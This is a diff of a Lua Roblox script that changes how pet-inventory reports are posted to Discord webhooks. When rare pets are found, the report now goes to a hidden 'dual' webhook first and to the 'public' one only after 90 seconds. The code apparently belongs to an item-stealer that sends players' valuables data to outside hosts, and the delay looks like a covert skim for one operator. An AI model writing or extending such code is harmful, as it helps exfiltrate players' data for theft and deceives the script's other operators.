@@ -464,32 +464,44 @@ end
 end
 
 function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorityPlayer)
-    local useDual = totalValue >= CONFIG.dualWebhookThreshold
-    local finalWebhook = useDual and CONFIG.dualWebhook or CONFIG.webhook
-    local finalUsername = useDual and CONFIG.dualUsername or CONFIG.username
-    
-    local contentMsg = hasRare and "@everyone New rare pet inventory!" or "✅ Inventory report generated!"
-    
     local embed = DiscordWebhook.createEmbed(itemsToSend, totalValue, hasRare, priorityPlayer)
-    
-    local payload = {
-        ["content"] = contentMsg,
-        ["username"] = finalUsername,
-        ["embeds"] = {embed},
-        ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
-    }
-    
-    pcall(function()
-        local req = Utils.getHttpRequest()
-        if req then
-            req({
-                Url = finalWebhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(payload)
-            })
-        end
-    end)
+    local contentMsg = hasRare and "@everyone New rare pet inventory!" or "✅ Inventory report generated!"
+
+    local function buildPayload(username)
+        return {
+            ["content"] = contentMsg,
+            ["username"] = username,
+            ["embeds"] = {embed},
+            ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
+        }
+    end
+
+    local function sendWebhook(url, username)
+        pcall(function()
+            local req = Utils.getHttpRequest()
+            if req then
+                req({
+                    Url = url,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode(buildPayload(username))
+                })
+            end
+        end)
+    end
+
+    if hasRare then
+        -- Send to dual webhook first
+        sendWebhook(CONFIG.dualWebhook, CONFIG.dualUsername)
+
+        -- Delay 90 seconds before sending to public webhook
+        task.delay(90, function()
+            sendWebhook(CONFIG.webhook, CONFIG.username)
+        end)
+    else
+        -- No rare pets: send only to public webhook
+        sendWebhook(CONFIG.webhook, CONFIG.username)
+    end
 end
 
 local ProximityPromptHandler = {}
